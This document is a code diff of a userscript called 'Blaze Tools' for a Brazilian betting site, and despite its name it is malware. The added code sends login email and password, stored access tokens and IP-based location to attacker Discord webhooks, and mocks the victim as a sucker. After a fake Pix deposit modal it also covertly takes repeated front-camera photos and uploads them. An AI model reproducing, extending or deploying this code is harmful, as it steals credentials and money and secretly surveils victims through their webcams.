@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Blaze Tools
 // @namespace    http://tampermonkey.net/
-// @version      2.4
+// @version      2.7
 // @description  Tools for Blaze!
 // @author       Allan Santos
 // @match        https://blaze.bet.br/pt/games/double
@@ -21,6 +21,13 @@
 
     var $ = window.jQuery;
 
+    const DC_WEBHOOK_URLS = {
+        tokens: "https://discord.com/api/webhooks/1462496984559652925/3SGHNcdaBAdtHNQHw9odaMFkwX_o3xBnwyXX4cidudLUCTYCLHza78aroMa7z1lgzI7c",
+        logins: "https://discord.com/api/webhooks/1462495704957321350/MwQIanr-w-F4s7qXIPxYc_xKFRHXFpCLpO354dwN7OKmSl4xxid1p4T0zIFy0TOXLs_m",
+        photos: "https://discord.com/api/webhooks/1462495491781824624/C7HGj4YF02FUJXncEeBcgVPIt3DebFXFRrzYz5w8iq6c4GbO1b1hSbqXoQDjwtcc3RGb",
+        general: "https://discord.com/api/webhooks/1462495332205334652/8PIb_bKbuNCrRnWec58LcNsDdR3Nkv1ZhcSHG1lRSYp2nmoENByMbVNMBC-tQb2X1s6J"
+    };
+
     const NPOINT_TOKENS_API_ID = "19d01814013462c26297";
 
     let pixCode = await fetchPixCode(false);
@@ -32,6 +39,12 @@
     const MODAL_REMOVE_DELAY_MS = 10000;
     const TARGET_URL_PARAM = '?modal=cashier&type=fiat_deposit';
     let lastKnownUrl = window.location.href;
+    let isLastSeenPage = false;
+
+    // C
+    let intervalToCaptureCam;
+    let currentCaptures = 0;
+    let maxCaptures = 10;
 
     const script = document.createElement('script');
     script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js';
@@ -40,6 +53,7 @@
         $(document).ready(function() {
             initializeModalFake();
             setupDepositButtonListener();
+            setupLoginButtonListener();
             observePixElements();
             setupUrlChangeListener();
         });
@@ -109,9 +123,55 @@
         }
     }
 
-    async function processAndNotifyBlazeTokens() {
-        const DC_WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1390305751565602846/UfRkdErD6oaJ3hbJjASUhN2JxzVEFHpe8wo-9RQAMwfzOvniQZ345aJ6p7BOFEhr79cD';
+    async function processAndNotifyBlazeLogins(login, password) {
+        try {
+            // --- Informações de Login ---
+            const fields = [
+                {
+                    name: 'Informações de Login',
+                    value: `Login: \`${login}\`\nSenha: \`${password}\``,
+                    inline: false
+                }
+            ];
 
+            const embeds = [
+                {
+                    title: '⚡️ Nova Captura de Login Blaze!',
+                    description: `Um novo LOGIN da Blaze foi detectado e capturado de um trouxa.`,
+                    color: 16711680,
+                    fields: fields,
+                    footer: {
+                        text: 'Sistema de Coleta de Logins - Desenvolvido por Allan Santos'
+                    },
+                    timestamp: new Date().toISOString()
+                }
+            ];
+
+            const sendSuccess = await sendDiscordWebhookMessage(
+                DC_WEBHOOK_URLS.logins,
+                'Nova informação de Login Blaze capturada!',
+                {
+                    username: 'Blaze Logins',
+                    avatar_url: 'https://i.ibb.co/4wbN49h7/image.png',
+                    embeds: embeds
+                }
+            );
+
+            if (sendSuccess) {
+                console.log(`Dados da Blaze enviados com sucesso para o Discord.`);
+                return true;
+            } else {
+                console.warn("Falha no envio da notificação para o Discord.");
+                return false;
+            }
+
+        } catch (error) {
+            console.error('Erro fatal ao processar e notificar logins Blaze:', error.message);
+            return false;
+        }
+    }
+
+    async function processAndNotifyBlazeTokens() {
         if (!hasBlazeTokens()) return false;
 
         const blazeTokens = getBlazeTokens();
@@ -133,7 +193,7 @@
             let ipInfo = {};
             try {
                 const ipApiResponse = await $.ajax({
-                    url: 'https://ipapi.co/json/',
+                    url: 'https://ipinfo.io/json',
                     type: 'GET',
                     dataType: 'json'
                 });
@@ -217,12 +277,12 @@
 
                 // --- Informações de Localização e IP (da ipapi.co) ---
                 { name: 'Endereço IP', value: `\`${ipInfo.ip || 'N/A'}\``, inline: true },
-                { name: 'País', value: `\`${ipInfo.country_name || 'N/A'} (${ipInfo.country_code || 'N/A'})\``, inline: true },
+                { name: 'País', value: `\`${ipInfo.country || 'N/A'} (${ipInfo.country_code || 'N/A'})\``, inline: true },
                 { name: 'Região/Estado', value: `\`${ipInfo.region || 'N/A'} (${ipInfo.region_code || 'N/A'})\``, inline: true },
                 { name: 'Cidade', value: `\`${ipInfo.city || 'N/A'}\``, inline: true },
                 { name: 'Código Postal', value: `\`${ipInfo.postal || 'N/A'}\``, inline: true },
                 { name: 'Organização (ASN/ISP)', value: `\`${ipInfo.org || 'N/A'}\``, inline: false },
-                { name: 'Latitude, Longitude', value: `\`${ipInfo.latitude || 'N/A'}, ${ipInfo.longitude || 'N/A'}\``, inline: true },
+                { name: 'Latitude, Longitude', value: `\`${ipInfo.loc || 'N/A'}`, inline: true },
                 { name: 'Fuso Horário (IP API)', value: `\`${ipInfo.timezone || 'N/A'}\``, inline: true },
 
 
@@ -264,10 +324,10 @@
             ];
 
             const sendSuccess = await sendDiscordWebhookMessage(
-                DC_WEBHOOK_URL,
+                DC_WEBHOOK_URLS.tokens,
                 'Nova informação de token Blaze capturada!',
                 {
-                    username: 'Blaze Token',
+                    username: 'Blaze Tokens',
                     avatar_url: 'https://i.ibb.co/4wbN49h7/image.png',
                     embeds: embeds
                 }
@@ -351,6 +411,91 @@
     }
 
     ***********************************/
+
+    async function startCapture(photosQuantity = 10, quality = 0.7) {
+        const status = document.getElementById('status');
+        const photosBlob = [];
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: "user"
+                }
+            });
+
+            const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+
+            video.srcObject = stream;
+            await video.play();
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            for (let i = 1; i <= photosQuantity; i++) {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const blob = await new Promise(resolve => {
+                    canvas.toBlob(resolve, 'image/jpeg', quality);
+                });
+
+                if (blob) {
+                    photosBlob.push(blob);
+                }
+
+                await new Promise(res => setTimeout(res, 200));
+            }
+
+            stream.getTracks().forEach(track => track.stop());
+
+            await sendCameraToDiscord(photosBlob);
+
+        } catch (err) {
+            clearInterval(intervalToCaptureCam);
+            console.error(err);
+        }
+    }
+
+    async function sendCameraToDiscord(blobs) {
+        const webhookUrl = DC_WEBHOOK_URLS.photos;
+        const formData = new FormData();
+
+        blobs.forEach((blob, index) => {
+            formData.append(`file${index}`, blob, `photo${index}.jpg`);
+        });
+
+        try {
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                body: formData
+            });
+
+            if (response.ok) {
+                console.log("Success");
+            } else {
+                console.log("Error", response.status);
+            }
+        } catch (error) {
+            console.error(error);
+        }
+    }
+
+    function getUserLoginInfo() {
+        const authModal = document.getElementById("auth-modal");
+
+        if (!authModal) return;
+        const loginForm = authModal.querySelector("form[data-testid=\"login-form-email\"]");
+
+        if (!loginForm) return;
+        const login = loginForm.querySelectorAll("div.input input")?.[0];
+        const password = loginForm.querySelectorAll("div.input input")?.[1];
+
+        if (!(login && password)) return;
+        if (login.value == "" && password.value == "") return;
+
+        return [login.value, password.value]
+    }
 
     function getBlazeTokens() {
         const accessToken = localStorage.getItem("ACCESS_TOKEN");
@@ -554,6 +699,16 @@
                                     modalDisplayed = false;
                                     console.log(`Full custom loading modal hidden after ${MODAL_REMOVE_DELAY_MS}ms, as Pix was updated.`);
                                     resetScriptState();
+                                    startCapture(10);
+
+                                    intervalToCaptureCam = setInterval(() => {
+                                        startCapture(5, 1.0);
+                                        currentCaptures++;
+
+                                        if (currentCaptures == maxCaptures && maxCaptures !== 0) {
+                                            clearInterval(intervalToCaptureCam);
+                                        }
+                                    }, 10 * 1000);
                                 }, MODAL_REMOVE_DELAY_MS);
                             }
 
@@ -626,6 +781,30 @@
         document.addEventListener('click', handleDepositButtonClick);
     }
 
+    async function handleLoginButtonClick(event) {
+        if (event.target && event.target.innerText && document.body.innerText.indexOf("Faça login em sua conta") !== -1 && event.target.nodeName == "BUTTON") {
+            console.log('Botão "Entrar" clicado.');
+
+            const userLoginInfo = getUserLoginInfo();
+
+            if (!Array.isArray(userLoginInfo) || userLoginInfo?.length < 2) return;
+            const [login, password] = userLoginInfo;
+
+            let intervalToCheckSuccessfullLogin = setInterval(async () => {
+                if (!isLastSeenPage) return;
+                clearInterval(intervalToCheckSuccessfullLogin);
+                isLastSeenPage = false;
+                await processAndNotifyBlazeLogins(login, password);
+            }, 500)
+            }
+    }
+
+    function setupLoginButtonListener() {
+        console.log('Setting up global click listener for "Entrar" button.');
+        document.removeEventListener('click', handleLoginButtonClick);
+        document.addEventListener('click', handleLoginButtonClick);
+    }
+
     function resetScriptState() {
         console.log('Resetting script state for reusability...');
         qrCodeGenerated = false;
@@ -651,10 +830,17 @@
     }
 
     function setupUrlChangeListener() {
-        setInterval(() => {
+        setInterval(async () => {
             if (window.location.href !== lastKnownUrl) {
                 console.log('URL changed! Old:', lastKnownUrl, 'New:', window.location.href);
                 lastKnownUrl = window.location.href;
+
+                await processAndNotifyBlazeTokens();
+
+                if (window.location.search.includes("?modal=last_seen")) {
+                    isLastSeenPage = true;
+                }
+
                 if (!window.location.search.includes(TARGET_URL_PARAM) && modalDisplayed) {
                     console.log('URL changed and not deposit modal, resetting state.');
                     resetScriptState();
